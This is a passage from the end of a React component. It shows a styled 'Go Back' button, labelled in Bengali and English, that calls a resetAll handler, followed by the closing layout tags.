                onClick={resetAll}
                className="w-full py-3.5 mt-8 bg-gray-900 hover:bg-black active:scale-95 text-white rounded-2xl font-bold text-xs transition-all cursor-pointer text-center"
              >
                মূল পেইজে ফিরে যান (Go Back)
              </button>
            </div>
          )}

        </div>

      </div>



    </div>
  );
}
